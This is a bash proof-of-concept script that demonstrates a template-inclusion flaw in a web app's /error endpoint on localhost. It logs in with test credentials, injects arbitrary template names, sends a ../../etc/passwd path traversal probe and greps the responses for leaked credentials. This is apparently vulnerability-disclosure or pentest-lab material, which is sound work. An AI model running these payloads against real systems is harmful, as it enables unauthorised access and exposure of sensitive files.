#!/bin/bash

# POC: Template Inclusion Vulnerability in Error Handler
# Demonstrates that the /error endpoint allows arbitrary template inclusion via error_type parameter

TARGET="http://localhost:8080"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Template Inclusion Vulnerability POC${NC}"
echo -e "${YELLOW}[*] Target: $TARGET${NC}\n"

# Step 1: Authenticate to get session cookie
echo -e "${YELLOW}[*] Step 1: Authenticating as test user...${NC}"
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  -c /tmp/poc_cookies.txt \
  -L)

if echo "$LOGIN_RESPONSE" | grep -q "Set-Cookie: session="; then
    SESSION_COOKIE=$(grep -oP "session=\K[^;]+" /tmp/poc_cookies.txt)
    echo -e "${GREEN}[+] Successfully authenticated. Session: ${SESSION_COOKIE:0:20}...${NC}\n"
else
    echo -e "${RED}[-] Authentication failed${NC}"
    exit 1
fi

# Step 2: Normal usage - include intended error template
echo -e "${YELLOW}[*] Step 2: Testing normal error template inclusion (not_implemented.html)...${NC}"
NORMAL_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/error?error_type=not_implemented.html&error_message=Test+Error" \
  -H "Cookie: session=$SESSION_COOKIE")

HTTP_CODE=$(echo "$NORMAL_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$NORMAL_RESPONSE" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo -e "${GREEN}[+] Normal template inclusion works${NC}"
else
    echo -e "${RED}[-] Unexpected response code${NC}"
fi
echo ""

# Step 3: VULNERABILITY - Include arbitrary template (login.html)
echo -e "${YELLOW}[*] Step 3: EXPLOITING - Including arbitrary template (login.html)...${NC}"
EXPLOIT_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/error?error_type=login.html&error_message=Exploited" \
  -H "Cookie: session=$SESSION_COOKIE")

HTTP_CODE=$(echo "$EXPLOIT_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$EXPLOIT_RESPONSE" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo -e "${RED}[!] VULNERABILITY CONFIRMED: Successfully included arbitrary template!${NC}"
    
    # Check for evidence of login.html content in response
    if echo "$BODY" | grep -q "username" && echo "$BODY" | grep -q "password"; then
        echo -e "${RED}[!] Login form fields detected in error page!${NC}"
    fi
    
    if echo "$BODY" | grep -q "test:test" || echo "$BODY" | grep -q "TODO.*Delete.*testing"; then
        echo -e "${RED}[!] HTML comments with credentials exposed via template inclusion!${NC}"
    fi
    
    # Show snippet of included content
    echo -e "\n${YELLOW}Response snippet (first 500 chars):${NC}"
    echo "$BODY" | head -c 500
    echo -e "\n..."
else
    echo -e "${GREEN}[+] Template inclusion blocked (unexpected)${NC}"
fi
echo ""

# Step 4: Test path traversal protection
echo -e "${YELLOW}[*] Step 4: Testing path traversal protection...${NC}"
TRAVERSAL_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/error?error_type=../../etc/passwd&error_message=Test" \
  -H "Cookie: session=$SESSION_COOKIE")

HTTP_CODE=$(echo "$TRAVERSAL_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$TRAVERSAL_RESPONSE" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" == "400" ] || echo "$BODY" | grep -q "Invalid template"; then
    echo -e "${GREEN}[+] Path traversal protection is active (but template inclusion still vulnerable)${NC}"
else
    echo -e "${YELLOW}[!] Path traversal protection may be weak${NC}"
fi
echo ""

# Step 5: Try including another template (profile.html)
echo -e "${YELLOW}[*] Step 5: Testing inclusion of profile.html...${NC}"
PROFILE_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/error?error_type=profile.html&error_message=Test" \
  -H "Cookie: session=$SESSION_COOKIE")

HTTP_CODE=$(echo "$PROFILE_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)

echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo -e "${RED}[!] Successfully included profile.html template${NC}"
else
    echo -e "${YELLOW}[*] profile.html may not exist or inclusion failed${NC}"
fi
echo ""

# Cleanup
rm -f /tmp/poc_cookies.txt

echo -e "${YELLOW}========================================${NC}"
echo -e "${RED}[!] VULNERABILITY SUMMARY:${NC}"
echo -e "${RED}    The /error endpoint allows arbitrary template inclusion${NC}"
echo -e "${RED}    User-controlled error_type parameter is used directly in {% include %}${NC}"
echo -e "${RED}    Attackers can include any template file to expose sensitive information${NC}"
echo -e "${YELLOW}========================================${NC}"